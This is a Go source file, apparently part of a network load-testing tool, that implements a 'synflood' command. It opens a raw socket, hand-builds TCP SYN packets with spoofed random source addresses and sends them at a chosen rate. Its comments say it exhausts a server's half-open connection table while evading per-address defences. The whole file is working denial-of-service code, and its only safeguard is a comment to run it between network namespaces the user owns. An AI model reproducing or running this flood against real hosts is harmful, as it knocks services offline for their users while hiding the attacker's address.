//go:build linux

package main

import (
	"encoding/binary"
	"fmt"
	"math/rand"
	"net"
	"os"
	"syscall"
	"time"
)

// tgload synflood -addr 10.77.0.1:8080 -pps 50000 -dur 30s -srcbase 10.77.128.0 -srcn 20000
//
// Raw TCP SYN packets with SPOOFED random source addresses taken from srcbase's range (needs root: raw socket). Nothing answers
// the SYN-ACKs, so the target's half-open table is what is under attack. This is the one flood that per-address
// defences cannot see: every packet comes from a "new" address. Run it only between network namespaces you own.
func runSynFlood(addr string, pps int, dur time.Duration, srcbase string, srcn int) {
	var c counters
	ta, err := net.ResolveTCPAddr("tcp4", addr)
	if err != nil {
		fmt.Fprintln(os.Stderr, err)
		os.Exit(1)
	}
	fd, err := syscall.Socket(syscall.AF_INET, syscall.SOCK_RAW, syscall.IPPROTO_RAW)
	if err != nil {
		fmt.Fprintln(os.Stderr, "raw socket (needs root):", err)
		os.Exit(1)
	}
	defer syscall.Close(fd)
	base := net.ParseIP(srcbase).To4()
	if base == nil {
		fmt.Fprintln(os.Stderr, "-srcbase must be an IPv4 address")
		os.Exit(2)
	}
	if srcn < 1 {
		srcn = 1
	}
	dst := ta.IP.To4()
	var sa syscall.SockaddrInet4
	copy(sa.Addr[:], dst)
	pkt := make([]byte, 44)
	deadline := time.Now().Add(dur)
	var sent int64
	tick := time.NewTicker(10 * time.Millisecond)
	defer tick.Stop()
	perTick := pps / 100
	if perTick < 1 {
		perTick = 1
	}
	for time.Now().Before(deadline) {
		<-tick.C
		for i := 0; i < perTick; i++ {
			v := (int(base[1]) << 16) | (int(base[2]) << 8) | int(base[3])
			v += rand.Intn(srcn)
			src := net.IPv4(base[0], byte(v>>16), byte(v>>8), byte(v)).To4()
			buildSyn(pkt, src, dst, uint16(1024+rand.Intn(60000)), uint16(ta.Port), rand.Uint32())
			if err := syscall.Sendto(fd, pkt, 0, &sa); err == nil {
				sent++
			} else {
				c.add("send_error", 1)
			}
		}
	}
	c.add("syn_sent", sent)
	emit("synflood", dur, &c, map[string]any{"pps_achieved": float64(sent) / dur.Seconds()})
}

func buildSyn(p []byte, src, dst net.IP, sport, dport uint16, seq uint32) {
	for i := range p {
		p[i] = 0
	}
	// IPv4 header (20 bytes): the kernel fills in the checksum when it is zero
	p[0] = 0x45
	binary.BigEndian.PutUint16(p[2:], uint16(len(p)))
	binary.BigEndian.PutUint16(p[4:], uint16(rand.Intn(65535)))
	p[8] = 64
	p[9] = syscall.IPPROTO_TCP
	copy(p[12:16], src)
	copy(p[16:20], dst)
	// TCP header (24 bytes with an MSS option)
	t := p[20:]
	binary.BigEndian.PutUint16(t[0:], sport)
	binary.BigEndian.PutUint16(t[2:], dport)
	binary.BigEndian.PutUint32(t[4:], seq)
	t[12] = 6 << 4 // data offset: 24 bytes
	t[13] = 0x02   // SYN
	binary.BigEndian.PutUint16(t[14:], 64240)
	t[20], t[21] = 2, 4 // MSS option
	binary.BigEndian.PutUint16(t[22:], 1460)
	// checksum over the pseudo header + TCP segment
	var sum uint32
	add := func(b []byte) {
		for i := 0; i+1 < len(b); i += 2 {
			sum += uint32(b[i])<<8 | uint32(b[i+1])
		}
	}
	add(src)
	add(dst)
	sum += uint32(syscall.IPPROTO_TCP) + uint32(len(t))
	add(t)
	for sum>>16 != 0 {
		sum = (sum & 0xffff) + (sum >> 16)
	}
	binary.BigEndian.PutUint16(t[16:], ^uint16(sum))
}
